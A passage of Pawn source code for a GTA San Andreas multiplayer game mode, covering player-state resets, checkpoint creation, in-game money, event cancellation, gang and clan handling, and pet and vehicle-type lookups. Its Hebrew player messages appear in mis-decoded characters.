	playerinfo[playerid][lastmoney] = 0;
	playerinfo[playerid][cana] = 1;
	playerinfo[playerid][cans] = 1;
	playerinfo[playerid][canafk] = 1;
	playerinfo[playerid][xjail] = 0;
	playerinfo[playerid][valarm] = 0;
	playerinfo[playerid][lasthealth] = 0.0;
	playerinfo[playerid][seth] = 0;
	playerinfo[playerid][lastarmour] = 0.0;
	playerinfo[playerid][seta] = 0;
	playerinfo[playerid][die] = 0;
	playerinfo[playerid][fkwarns] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][speedpos][i] = 0.0;
	playerinfo[playerid][modeafk] = 0;
	playerinfo[playerid][usedafk] = 0;
	playerinfo[playerid][earnings] = 1;
	playerinfo[playerid][waitsrace] = 0;
	playerinfo[playerid][insrace] = 0;
	playerinfo[playerid][sracecp] = 0;
	playerinfo[playerid][raceid] = 0;
	playerinfo[playerid][hitman] = 0;
	PlayerLeaveClan(playerid,4);
	playerinfo[playerid][clan] = 0;
	playerinfo[playerid][lclan] = 0;
	playerinfo[playerid][tclan] = 0;
	playerinfo[playerid][clanmanager] = 0;
	playerinfo[playerid][vipmanager] = 0;
	playerinfo[playerid][housemanager] = 0;
	playerinfo[playerid][codesmanager] = 0;
	playerinfo[playerid][mss] = 0;
	playerinfo[playerid][wlevel] = 0;
	playerinfo[playerid][wantedlevel] = 0;
	dbg(100,"8");
	if(playerinfo[playerid][bomb] == 55) DestroyPickup(playerinfo[playerid][bombpickup]);
	playerinfo[playerid][bomb] = 0;
	playerinfo[playerid][banned] = 0;
	//playerinfo[playerid][conference] = -1;
	playerinfo[playerid][canwithdraw] = 1;
	playerinfo[playerid][houseid] = -1;
	playerinfo[playerid][house] = -1;
	for(new i=0;i<max_houses;i++) playerinfo[playerid][houseacc][i] = 0;
	playerinfo[playerid][jetpack] = 0;
	playerinfo[playerid][pleasemoney] = 0;
	playerinfo[playerid][pmath] = -1;
	playerinfo[playerid][angry] = {0,0};
	playerinfo[playerid][pinv] = 0;
	playerinfo[playerid][ptrivia] = -1;
	playerinfo[playerid][bonus_si] = 0;
	for(new i=0;i<MAX_PLAYERS;i++) playerinfo[playerid][carjack][i] = 1;
	playerinfo[playerid][inhouse] = -1;
	playerinfo[playerid][canp] = 1;
	format(playerinfo[playerid][lastvmessage],M_S," ");
	dbg(100,"9");
	playerinfo[playerid][vheal] = 0;
	playerinfo[playerid][vrocket] = 0;
	playerinfo[playerid][vsuicide] = {0,0};
	playerinfo[playerid][nr] = 0;
	playerinfo[playerid][boomcar] = 0;
	playerinfo[playerid][abf] = {0,INVALID_VEHICLE_ID};
	playerinfo[playerid][sb] = 0;
	playerinfo[playerid][nswarns] = 0;
	playerinfo[playerid][wehateyou] = -1;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][lastpm] == playerid) playerinfo[i][lastpm] = INVALID_PLAYER_ID;
	dbg(100,"10");
	playerinfo[playerid][lastpm] = INVALID_PLAYER_ID;
	playerinfo[playerid][savepms] = 1;
	playerinfo[playerid][waitkickstar] = 0;
	playerinfo[playerid][inkickstar] = 0;
	playerinfo[playerid][kickstarid] = -1;
	playerinfo[playerid][kickstarscore] = 0;
	playerinfo[playerid][cranetime] = 0;
	playerinfo[playerid][incrane] = 0;
	playerinfo[playerid][lastammo] = 0;
	playerinfo[playerid][lastweapon] = 0;
	playerinfo[playerid][dscmd] = 0;
	playerinfo[playerid][indialog] = -1;
	playerinfo[playerid][tinfo] = 0;
	playerinfo[playerid][inarmy] = 0;
	playerinfo[playerid][inplane] = 0;
	playerinfo[playerid][inshooting] = -1;
	playerinfo[playerid][savedweapons] = {0,0,0,0,0,0,0,0,0,0,0,0,0};
	playerinfo[playerid][savedammo] = {0,0,0,0,0,0,0,0,0,0,0,0,0};
	for(new i = 0; i < 3; i++) playerinfo[playerid][afv][i] = 0.0;
	playerinfo[playerid][afvcheck] = {0,0};
	playerinfo[playerid][bacc] = 0;
	playerinfo[playerid][getloan] = 0;
	playerinfo[playerid][sdboxrob] = 0;
	SetPlayerFightingStyle(playerid,15);
	playerinfo[playerid][clickon] = 0;
	playerinfo[playerid][raise] = INVALID_PLAYER_ID;
	playerinfo[playerid][pump] = INVALID_PLAYER_ID;
	for(new i = 0; i < 50; i++) playerinfo[playerid][upgradecmd][i] = 0;
	playerinfo[playerid][underearth] = 0;
	playerinfo[playerid][mapolet] = {0,0,0,0,0,0,0};
	for(new i = 0; i < 7; i++) playerinfo[playerid][mapoletstart][i] = 0.0;
	playerinfo[playerid][fireball] = -1;
	playerinfo[playerid][quicklydefence] = 0;
	playerinfo[playerid][phealth] = 0.0;
	playerinfo[playerid][parmour] = 0.0;
	playerinfo[playerid][tornado] = 0;
	playerinfo[playerid][wskill] = {999,999,999,999,999,999,999,999,999,999,999};
	playerinfo[playerid][wcwarns] = 0;
	playerinfo[playerid][hbombcount] = 0;
	dbg(100,"11");
	return 1;
}
//=[rgba2hex]===================================================================
stock rgba2hex(r,g,b,a) return (r*16777216) + (g*65536) + (b*256) + a;   // by Y_Less, improved by me
//=[IsPlayerInArea]=============================================================
stock IsPlayerInArea(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	return p[0] >= min_x && p[0] <= max_x && p[1] >= min_y && p[1] <= max_y;
}
//=[CreateBank]=================================================================
stock CreateBank(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateBank(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_bank,size,distance);
	return 1;
}
//=[CreateAmmunation]===========================================================
stock CreateAmmunation(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateAmmunation(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_ammu,size,distance);
	return 1;
}
//=[CreateSAmmunation]==========================================================
stock CreateSAmmunation(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateSAmmunation(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_sammu,size,distance);
	return 1;
}
//=[CreateWang]=================================================================
stock CreateWang(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateWang(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_wang,size,distance);
	return 1;
}
//=[CreateCBank]================================================================
stock CreateCBank(Float:x,Float:y,Float:z,clani,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateCBank(%.4f,%.4f,%.4f,%d,%.1f,%.1f,1);\r\n",x,y,z,clani,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	return CreateCheckpoint(x,y,z,cp_cbank,size,distance,clani);
}
//=[CreateClothes]==============================================================
stock CreateClothes(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateClothes(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_clothes,size,distance);
	return 1;
}
//=[CreateSuperBonuses]=========================================================
stock CreateSuperBonuses(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateSuperBonuses(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_superbonuses,size,distance);
	return 1;
}
//=[CreateVGarage]==============================================================
stock CreateVGarage(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateVGarage(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_vgarage,size,distance);
	return 1;
}
//=[CreateBar]==================================================================
stock CreateBar(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_cps)) fcreate(file_cps);
		f = fopen(file_cps,io_append);
		format(string,sizeof(string),"CreateBar(%.4f,%.4f,%.4f,%.1f,%.1f,1);\r\n",x,y,z,size,distance);
		fwrite(f,string);
		fclose(f);
	}
	CreateCheckpoint(x,y,z,cp_bar,size,distance);
	return 1;
}
//=[GiveMoney]==================================================================
stock GiveMoney(playerid,amount,bool:snd=true)
{
	#if acmoney == 2
		playerinfo[playerid][money][2] = 1;
		if(amount < 0) playerinfo[playerid][money][0] -= amount;
		else playerinfo[playerid][money][0] += amount;
		GivePlayerMoney(playerid,amount);
		if(amount < 0) playerinfo[playerid][money][1] -= amount;
		else playerinfo[playerid][money][1] += amount;
	#elseif acmoney == 1
	playerinfo[playerid][money][0] += amount;
	GivePlayerMoney(playerid,amount);
		/*if(amount > 0)
		{
			playerinfo[playerid][money][0] += amount;
			GivePlayerMoney(playerid,amount);
		}
		else
		{
			GivePlayerMoney(playerid,amount);
			playerinfo[playerid][money][0] -= amount;
		}*/
	#endif
	if(GetPlayerMoney(playerid) < 0) ResetMoney(playerid);
	if(!playerinfo[playerid][modeafk] && snd) PlayerPlaySound(playerid,1052,0.0,0.0,0.0);
	return 1;
}
//=[ResetMoney]=================================================================
stock ResetMoney(playerid,bool:snd=true)
{
	//playerinfo[playerid][money][2] = 1;
	//playerinfo[playerid][money][0] = 0;
	ResetPlayerMoney(playerid);
	#if acmoney == 1
		playerinfo[playerid][money] = 0;
	#endif
	//playerinfo[playerid][money][1] = 0;
	if(!playerinfo[playerid][modeafk] && snd) PlayerPlaySound(playerid,1053,0.0,0.0,0.0);
	return 1;
}
//=[GetMoney]===================================================================
stock GetMoney(playerid) return playerinfo[playerid][money][0];
/*//=[CreateVehicles]=============================================================
stock CreateVehicles(amount,vehicletype,Float:x,Float:y,Float:z,Float:rotation,Float:plusx,Float:plusy,color1,color2,respawn_delay,interior,world)
{
	new Float:plusx2 = (0-plusx), Float:plusy2 = (0-plusy);
	for(new i=0;i<amount;i++)
	{
		plusx2 += plusx, plusy2 += plusy;
		CreateVehicleEx(vehicletype,x+plusx2,y+plusy2,z,rotation,color1,color2,respawn_delay,interior,world);
	}
	return 1;
}*/
//=[floatrand]==================================================================
forward Float:floatrand(Float:min, Float:max);
public Float:floatrand(Float:min, Float:max)
{
	new imin = floatround(min);
	return float(random((floatround(max) - imin) * 100) + (imin * 100)) / 100.0;
}
//=[EndRace]====================================================================
stock EndRace(reason[],adminid)
{
	new string[M_S];
	assert raceinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .äîéøåõ áåèì");
	else format(string,sizeof(string)," .%s äîéøåõ áåèì òì éãé äàãîéï",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inrace] || playerinfo[i][waitrace]))
		{
			if(playerinfo[i][inrace])
			{
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
				DisablePlayerRaceCheckpoint(i);
				SendClientMessage(i,orange," .÷éáìú ôéöåé ëñôé [500$] òì ëê ùäîéøåõ áåèì");
				GiveMoney(i,500);
			}
			playerinfo[i][inrace] = 0, playerinfo[i][waitrace] = 0, playerinfo[i][racecp] = 0, playerinfo[i][raceid] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	raceinfo[0] = 0, raceinfo[1] = 0, raceinfo[2] = 0, raceinfo[4] = 99, raceinfo[6] = 0;
	KillTimer(raceinfo[3]);
	return 1;
}
//=[EndWar]=====================================================================
stock EndWar(reason[],adminid)
{
	new string[M_S];
	assert warinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .äîìçîä áåèìä");
	else format(string,sizeof(string)," .%s äîìçîä áåèìä òì éãé äàãîéï",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inwar] || playerinfo[i][waitwar]))
		{
			if(playerinfo[i][inwar])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .÷éáìú ôéöåé ëñôé [350$] òì ëê ùîìçîú äùøú áåèìä");
				GiveMoney(i,350);
			}
			playerinfo[i][inwar] = 0, playerinfo[i][waitwar] = 0, playerinfo[i][warid] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	warinfo[0] = 0, warinfo[1] = 0, warinfo[2] = 0, warinfo[5] = 0;
	KillTimer(warinfo[3]);
	return 1;
}
//=[EndWWE]=====================================================================
stock EndWWE(reason[],adminid)
{
	new string[M_S];
	assert wweinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .áåèìä WWE úçøåú ä");
	else format(string,sizeof(string)," .%s áåèìä òì éãé äàãîéï WWE úçøåú ä",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(playerinfo[i][inwwe] || playerinfo[i][waitwwe])
			{
				if(playerinfo[i][inwwe])
				{
					SpawnPlayer(i);
					SetPlayerInterior(i,0);
					SetFreeze(i,0);
					SetPlayerVirtualWorld(i,world_normal);
					SendClientMessage(i,orange," .áåèìä WWE ÷éáìú ôéöåé ëñôé [150$] òì ëê ùúçøåú ä");
					GiveMoney(i,150);
				}
				playerinfo[i][inwwe] = 0, playerinfo[i][waitwwe] = 0, playerinfo[i][wweid] = 0;
				playerinfo[i][inact] = 0;
			}
			else if(playerinfo[i][viewerwwe])
			{
				playerinfo[i][viewerwwe] = 0;
				TogglePlayerSpectating(i,0);
				SendClientMessage(i,orange," .áåèìä WWE úçøåú ä");
			}
		}
	}
	wweinfo[0] = 0, wweinfo[1] = 0, wweinfo[2] = 0, wweinfo[4] = 0;
	KillTimer(wweinfo[3]);
	return 1;
}
//=[EndKart]====================================================================
stock EndKart(reason[],adminid)
{
	new string[M_S];
	assert kartinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .áåèìä Kart úçøåú ä");
	else format(string,sizeof(string)," .%s áåèìä òì éãé äàãîéï Kart úçøåú ä",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inkart] || playerinfo[i][waitkart]))
		{
			if(playerinfo[i][inkart])
			{
				SetFreeze(i,0);
				DestroyVehicleEx(playerinfo[i][kartv]);
				SpawnPlayer(i);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .áåèìä Kart ÷éáìú ôéöåé ëñôé [500$] òì ëê ùúçøåú ä");
				GiveMoney(i,500);
			}
			playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
	KillTimer(kartinfo[3]);
	return 1;
}
//=[EndMonster]=================================================================
stock EndMonster(reason[],adminid)
{
	new string[M_S];
	assert monsterinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .áåèìä Monster úçøåú ä");
	else format(string,sizeof(string)," .%s áåèìä òì éãé äàãîéï Monster úçøåú ä",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inmonster] || playerinfo[i][waitmonster]))
		{
			if(playerinfo[i][inmonster])
			{
				SetFreeze(i,0);
				DestroyVehicleEx(GetPlayerVehicleID(i));
				SpawnPlayer(i);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .áåèìä Monster ÷éáìú ôéöåé ëñôé [500$] òì ëê ùúçøåú ä");
				GiveMoney(i,500);
			}
			playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0;
	KillTimer(monsterinfo[3]);
	return 1;
}
//=[ExitWork]===================================================================
stock ExitWork(playerid,reason[])
{
	new string[M_S];
	playerinfo[playerid][work] = work_none;
	playerinfo[playerid][coplevel] = 0;
	playerinfo[playerid][doctorlevel] = 0;
	SendClientMessage(playerid,red," :éöàú \\ äåöàú îòáåãúê. ñéáä");
	format(string,sizeof(string)," %s",reason);
	SendClientMessage(playerid,red,string);
	return 1;
}
//=[IsPlayerMAdmin]=============================================================
stock IsPlayerMAdmin(playerid) return playerinfo[playerid][admin] > 0 ? true : false;
//=[GetPetModel]================================================================
stock GetPetModel(petid)
{
	switch(petid)
	{
		case pet_none: return 0;
		case pet_fish: return 1599;
		case pet_jelly: return 1602;
		case pet_rjelly: return 1603;
		case pet_turtle: return 1609;
		case pet_dolphin: return 1607;
		case pet_shark: return 1608;
		default: return -1;
	}
	return -1;
}
//=[GetPetRadius]===============================================================
forward Float:GetPetRadius(petid);
public Float:GetPetRadius(petid)
{
	switch(petid)
	{
		case pet_none: return 0.0;
		case pet_fish: return 10.0;
		case pet_jelly: return 12.0;
		case pet_rjelly: return 14.5;
		case pet_turtle: return 20.0;
		case pet_dolphin: return 30.0;
		case pet_shark: return 35.5;
		default: return -1.0;
	}
	return -1.0;
}
//=[GetPetAttackRadius]=========================================================
forward Float:GetPetAttackRadius(petid);
public Float:GetPetAttackRadius(petid)
{
	switch(petid)
	{
		case pet_none: return 0.0;
		case pet_fish: return 0.7;
		case pet_jelly: return 0.9;
		case pet_rjelly: return 1.0;
		case pet_turtle: return 3.0;
		case pet_dolphin: return 4.5;
		case pet_shark: return 6.5;
		default: return -1.0;
	}
	return -1.0;
}
//=[GetPetDamage]===============================================================
forward Float:GetPetDamage(petid);
public Float:GetPetDamage(petid)
{
	switch(petid)
	{
		case pet_none: return 0.00;
		case pet_fish: return 0.10;
		case pet_jelly: return 0.25;
		case pet_rjelly: return 0.50;
		case pet_turtle: return 0.75;
		case pet_dolphin: return 1.0;
		case pet_shark: return 2.0;
		default: return -1.0;
	}
	return -1.0;
}
//=[GetPetSpeed]================================================================
forward Float:GetPetSpeed(petid);
public Float:GetPetSpeed(petid)
{
	switch(petid)
	{
		case pet_none: return 0.0;
		case pet_fish: return 0.8;
		case pet_jelly: return 1.2;
		case pet_rjelly: return 1.4;
		case pet_turtle: return 2.0;
		case pet_dolphin: return 2.5;
		case pet_shark: return 3.0;
		default: return -1.0;
	}
	return -1.0;
}
//=[randomEx]===================================================================
stock randomEx(min,max) return random(max-min)+min;
//=[GetXYInFrontOfPlayer]=======================================================
stock GetXYInFrontOfPlayer(playerid,&Float:x,&Float:y,Float:distance)
{   // by Y_Less, improved by me
	new Float:a;
	GetPlayerPos(playerid,x,y,a);
	GetPlayerFacingAngle(playerid,a);
	if(GetPlayerVehicleID(playerid)) GetVehicleZAngle(GetPlayerVehicleID(playerid),a);
	x += (distance * floatsin(-a,degrees)), y += (distance * floatcos(-a,degrees));
	return 1;
}
//=[WeaponName]=================================================================
stock WeaponName(weaponid) return WeaponNames[weaponid];
//=[SetFreeze]==================================================================
stock SetFreeze(playerid,freeze)
{
	TogglePlayerControllable(playerid,freeze? 0:1);
	playerinfo[playerid][frozen] = freeze;
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	for(new i=0;i<3;i++) playerinfo[playerid][freezepos][i] = freeze? p[i]:0.0;
	return 1;
}
//=[PlayerLeaveGang]============================================================
stock PlayerLeaveGang(playerid,mtype)
{
	new string[M_S];
	if(playerinfo[playerid][gang] > 0)
	{
		for(new i=0;i<ganginfo[playerinfo[playerid][gang]][gmembers];i++)
		{
			if(ganginfo[playerinfo[playerid][gang]][gplayers][i] == playerid)
			{
				ganginfo[playerinfo[playerid][gang]][gmembers]--;
	  			for(new j=i;j<ganginfo[playerinfo[playerid][gang]][gmembers];j++) ganginfo[playerinfo[playerid][gang]][gplayers][j] = ganginfo[playerinfo[playerid][gang]][gplayers][j+1];
	  			if(ganginfo[playerinfo[playerid][gang]][gleader] == playerid) ganginfo[playerinfo[playerid][gang]][gleader] = INVALID_PLAYER_ID;
				if(ganginfo[playerinfo[playerid][gang]][gmembers] <= 0)
				{
					ganginfo[playerinfo[playerid][gang]][gexist] = 0;
					ganginfo[playerinfo[playerid][gang]][gmembers] = 0;
					ganginfo[playerinfo[playerid][gang]][gbank] = 0;
					ganginfo[playerinfo[playerid][gang]][gleader] = INVALID_PLAYER_ID;
					for(new j=0;j<3;j++) ganginfo[playerinfo[playerid][gang]][gcolor][j] = 0;
	   			}
	   			if(mtype != 0)
	   			{
					for(new j=0;j<ganginfo[playerinfo[playerid][gang]][gmembers];j++)
					{
						if(mtype == 1) format(string,sizeof(string)," .ôøù îäëðåôééä %s",GetName(playerid));
						else if(mtype == 2) format(string,sizeof(string)," .äåöà îäëðåôééä %s",GetName(playerid));
						SendClientMessage(ganginfo[playerinfo[playerid][gang]][gplayers][j],red,string);
					}
				}
				format(string,sizeof(string)," .\"%s\" éöàú îëðåôééú",ganginfo[playerinfo[playerid][gang]][gname]);
				SendClientMessage(playerid,orange,string);
				playerinfo[playerid][gang] = 0, playerinfo[playerid][igang] = -1;
				SetPlayerColor(playerid,rgba2hex(playerinfo[playerid][color][0],playerinfo[playerid][color][1],playerinfo[playerid][color][2],100));
			}
		}
	}
	return 1;
}
//=[PlayerLeaveClan]============================================================
stock PlayerLeaveClan(playerid,mtype)
{
	new string[M_S];
	if(playerinfo[playerid][clan] != 0)
	{
		for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++)
		{
			if(claninfo[playerinfo[playerid][clan]][cplayers][i] == playerid)
			{
				claninfo[playerinfo[playerid][clan]][cmembers]--;
	  			for(new j=i;j<claninfo[playerinfo[playerid][clan]][cmembers];j++) claninfo[playerinfo[playerid][clan]][cplayers][j] = claninfo[playerinfo[playerid][clan]][cplayers][j+1];
	   			if(mtype != 0)
	   			{
					for(new j=0;j<claninfo[playerinfo[playerid][clan]][cmembers];j++)
					{
						if(mtype == 1) format(string,sizeof(string)," .ôøù îä÷ìàï %s",GetName(playerid));
						else if(mtype == 2) format(string,sizeof(string)," .äåöà îä÷ìàï %s",GetName(playerid));
						else if(mtype == 3) format(string,sizeof(string)," .äåöà îä÷ìàï òì éãé äàãîéï %s",GetName(playerid));
						SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][j],red,string);
					}
				}
				format(string,sizeof(string)," .\"%s\" éöàú îä÷ìàï",claninfo[playerinfo[playerid][clan]][cname]);
				if(mtype != 4) SendClientMessage(playerid,orange,string);
				playerinfo[playerid][clan] = 0, playerinfo[playerid][iclan] = 0, playerinfo[playerid][lclan] = 0, playerinfo[playerid][tclan] = 0;
				SetPlayerColor(playerid,GetColor(playerid,153));
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii)) SetPlayerMarkerForPlayer(ii,playerid,GetColor(playerid,153));
				if(playerinfo[playerid][logged])
				{
					fsetstring(fuser(playerid),"Clan2","None");
					fsetint(fuser(playerid),"Leader",0);
					fsetint(fuser(playerid),"Tester",0);
				}
			}
		}
	}
	return 1;
}
//=[strhex]=====================================================================
stock strhex(string[])
{   // by Y_Less, improved by me
	new ret, val, i;
	if(string[0] == '0' && (string[1] == 'x' || string[1] == 'X')) i = 2;
	while(string[i])
	{
		ret <<= 4, val = (string[i++] - '0');
		if(val > 0x09) val -= 0x07;
		if(val > 0x0F) val -= 0x20;
		if(val < 0x01) continue;
		if(val < 0x10) ret += val;
	}
	return ret;
}
//=[IsHex]======================================================================
stock IsHex(string[])
{   // by Y_Less, improved by me
	new i, cur;
	if(string[0] == '0' && (string[1] == 'x' || string[1] == 'X')) i = 2;
	while(string[i])
	{
		cur = string[i++];
		if((cur < '0') || (cur > '9' && cur < 'A') || (cur > 'F' && cur < 'a') || (cur > 'f')) return false;
	}
	return 1;
}
//=[IsRaceVehicle]==============================================================
stock IsRaceVehicle(racetype,vehicleid)
{
	if((racetype == race1_cars && GetVehicleType(vehicleid) != 0) ||
	(racetype == race2_bikes && GetVehicleType(vehicleid) != 1) ||
	(racetype == race3_planes && GetVehicleType(vehicleid) != 4 && GetVehicleModel(vehicleid) != 592 && GetVehicleModel(vehicleid) != 577) ||
	(racetype == race4_boats && GetVehicleType(vehicleid) != 2)) return 0;
	return 1;
}
//=[GetVehicleType]=============================================================
stock GetVehicleType(vid)
{   // by yellowblood, improved by me
	switch(GetVehicleModel(vid))
	{
		case
		596,   //copcarla,   //car
		599,   //copcarru,   //car
		597,   //copcarsf,   //car
		416,   //ambulan  -  car
		445,   //admiral  -  car
		602,   //alpha  -  car
		485,   //baggage  -  car
		568,   //bandito  -  car
		429,   //banshee  -  car
		499,   //benson  -  car
		424,   //bfinject,   //car
		536,   //blade  -  car
		496,   //blistac  -  car
		504,   //bloodra  -  car
		422,   //bobcat  -  car
		609,   //boxburg  -  car
		498,   //boxville,   //car
		401,   //bravura  -  car
		575,   //broadway,   //car
		518,   //buccanee,   //car
		402,   //buffalo  -  car
		541,   //bullet  -  car
		482,   //burrito  -  car
		431,   //bus  -  car
		438,   //cabbie  -  car
		457,   //caddy  -  car
		527,   //cadrona  -  car
		483,   //camper  -  car
		524,   //cement  -  car
		415,   //cheetah  -  car
		542,   //clover  -  car
		589,   //club  -  car
		480,   //comet  -  car
		578,   //dft30  -  car
		486,   //dozer  -  car
		507,   //elegant  -  car
		562,   //elegy  -  car
		585,   //emperor  -  car
		427,   //enforcer,   //car
		419,   //esperant,   //car
		587,   //euros  -  car
		490,   //fbiranch,   //car
		528,   //fbitruck,   //car
		533,   //feltzer  -  car
		544,   //firela  -  car
		407,   //firetruk,   //car
		565,   //flash  -  car
		455,   //flatbed  -  car
		530,   //forklift,   //car
		526,   //fortune  -  car
		466,   //glendale,   //car
		604,   //glenshit,   //car
		492,   //greenwoo,   //car
		474,   //hermes  -  car
		434,   //hotknife,   //car
		502,   //hotrina  -  car
		503,   //hotrinb  -  car
		494,   //hotring  -  car
		579,   //huntley  -  car
		545,   //hustler  -  car
		411,   //infernus,   //car
		546,   //intruder,   //car
		559,   //jester  -  car
		508,   //journey  -  car
		571,   //kart  -  car
		400,   //landstal,   //car
		403,   //linerun  -  car
		517,   //majestic,   //car
		410,   //manana  -  car
		551,   //merit  -  car
		500,   //mesa  -  car
		418,   //moonbeam,   //car
		572,   //mower  -  car
		423,   //mrwhoop  -  car
		516,   //nebula  -  car
		582,   //newsvan  -  car
		467,   //oceanic  -  car
		404,   //peren  -  car
		514,   //petro  -  car
		603,   //phoenix  -  car
		600,   //picador  -  car
		413,   //pony  -  car
		426,   //premier  -  car
		436,   //previon  -  car
		547,   //primo  -  car
		489,   //rancher  -  car
		441,   //rcbandit,   //car
		594,   //rccam  -  car
		564,   //rctiger  -  car
		515,   //rdtrain  -  car
		479,   //regina  -  car
		534,   //remingtn,   //car
		505,   //rnchlure,   //car
		442,   //romero  -  car
		440,   //rumpo  -  car
		475,   //sabre  -  car
		543,   //sadler  -  car
		605,   //sadlshit,   //car
		495,   //sandking,   //car
		567,   //savanna  -  car
		428,   //securica,   //car
		405,   //sentinel,   //car
		535,   //slamvan  -  car
		458,   //solair  -  car
		580,   //stafford,   //car
		439,   //stallion,   //car
		561,   //stratum  -  car
		409,   //stretch  -  car
		560,   //sultan  -  car
		550,   //sunrise  -  car
		506,   //supergt  -  car
		574,   //sweeper  -  car
		566,   //tahoma  -  car
		549,   //tampa  -  car
